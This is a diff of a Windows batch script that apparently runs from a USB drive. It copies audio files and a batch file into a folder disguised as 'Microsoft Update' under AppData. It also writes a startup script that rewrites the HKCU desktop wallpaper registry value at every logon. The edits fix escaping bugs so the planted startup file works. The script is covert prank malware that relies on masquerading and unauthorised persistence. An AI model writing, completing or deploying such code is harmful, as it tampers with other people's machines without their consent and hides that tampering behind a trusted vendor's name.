@@ -13,12 +13,12 @@ for /D %%A in (*) do (
 )
 
 (
-echo set "wallpaperPath="C:/Users/%username%/AppData/Local/Microsoft Update/thumboi.png"
-echo reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaperPath%" /f
+echo set "wallpaperPath="C:/Users/%%username%%/AppData/Local/Microsoft Update/thumboi.png"
+echo reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%%wallpaperPath%%" /f
 echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 ) > "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/wallpaper.bat"
 
-cd C:/Users/%username/AppData/Local
+cd C:/Users/%username%/AppData/Local
 mkdir "Microsoft Update"
 copy "%~d0/funnyahhaudio.wav" "C:/Users/%username%/AppData/Local/Microsoft Update"
 copy "%~d0/audio.bat" "C:/Users/%username%/AppData/Local/Microsoft Update"
